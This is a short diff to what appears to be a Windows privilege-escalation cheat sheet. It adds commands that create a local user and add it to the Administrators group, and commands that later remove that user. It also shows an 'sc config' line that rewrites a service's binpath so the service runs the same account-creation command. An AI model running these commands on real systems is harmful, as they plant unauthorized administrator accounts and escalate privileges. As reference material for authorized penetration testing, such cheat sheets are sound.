@@ -40,6 +40,18 @@ accesschk.exe -uwvc "normaluser" *
 Add user and assign to Administrators group:
 
 ```cmd
+cmd /c cmd.exe /c "net user <username> <password> /add && net localgroup Administrators <username> /add"
+```
+
+Delete user and remove from Administrators group:
+
+```cmd
+cmd /c cmd.exe /c "net localgroup Administrators <username> /delete && net user <username> /delete"
+```
+
+Modify the configuration of a service:
+
+```cmd
 sc config <service> binpath="cmd /c cmd.exe /c net user <username> <password> /add && net localgroup Administrators <username> /add"
 ```
 
